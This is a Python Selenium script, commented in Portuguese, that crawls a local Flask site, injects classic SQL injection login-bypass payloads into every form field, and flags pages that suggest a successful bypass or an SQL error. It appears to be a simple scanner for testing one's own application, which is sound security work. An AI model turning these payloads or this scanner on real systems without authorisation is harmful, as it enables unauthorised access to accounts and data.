from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time

# =========================
# CONFIGURAÇÃO
# =========================
BASE_URL = "http://127.0.0.1:5000"  # URL do seu Flask
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR ''='",
]

# =========================
# INICIALIZAÇÃO DO DRIVER
# =========================
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.get(BASE_URL)

visited = set()  # evita repetir páginas

# =========================
# FUNÇÃO: pega todos os links da página
# =========================
def get_links():
    links = driver.find_elements(By.TAG_NAME, "a")
    urls = []
    for link in links:
        href = link.get_attribute("href")
        if href and BASE_URL in href:
            urls.append(href)
    return urls

# =========================
# FUNÇÃO: testa todos os formulários da página
# =========================
def test_forms():
    try:
        forms = driver.find_elements(By.TAG_NAME, "form")
        for i in range(len(forms)):
            form = forms[i]
            inputs = form.find_elements(By.TAG_NAME, "input")

            for payload in PAYLOADS:
                print(f"\n[TESTANDO PAYLOAD] {payload}")

                # 🔁 Rebusta inputs para evitar StaleElementReference
                forms = driver.find_elements(By.TAG_NAME, "form")
                form = forms[i]
                inputs = form.find_elements(By.TAG_NAME, "input")

                for inp in inputs:
                    name = inp.get_attribute("name")
                    if not name:
                        continue
                    inp.clear()
                    inp.send_keys(payload)

                # Submete formulário
                try:
                    form.submit()
                except:
                    inputs[-1].send_keys(Keys.ENTER)

                # espera até o body carregar
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )

                page_source = driver.page_source.lower()

                # heurísticas de vulnerabilidade
                if "bem-vindo" in page_source or "login realizado" in page_source:
                    print("💀 POSSÍVEL SQL INJECTION DETECTADA!")
                if "erro sql" in page_source:
                    print("⚠️ ERRO SQL DETECTADO!")

                driver.back()
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                time.sleep(0.5)

    except Exception as e:
        print(f"⚠️ Erro ao testar formulário: {e}")
        driver.back()
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )

# =========================
# FUNÇÃO: abre URL em nova aba
# =========================
def open_in_new_tab(url):
    driver.execute_script(f"window.open('{url}', '_blank');")
    driver.switch_to.window(driver.window_handles[-1])

# =========================
# FUNÇÃO: crawler recursivo
# =========================
def crawl(url):
    if url in visited:
        return

    visited.add(url)
    print(f"\n[ABRINDO NOVA ABA] {url}")
    open_in_new_tab(url)
    WebDriverWait(driver, 5).until(
        EC.presence_of_element_located((By.TAG_NAME, "body"))
    )

    # testa formulários
    test_forms()

    # busca novos links
    links = get_links()
    for link in links:
        crawl(link)

# =========================
# EXECUÇÃO
# =========================
crawl(BASE_URL)

print("\n✅ Varredura finalizada")
print("🔎 O navegador continuará aberto para análise.")
input("Pressione ENTER para encerrar manualmente...")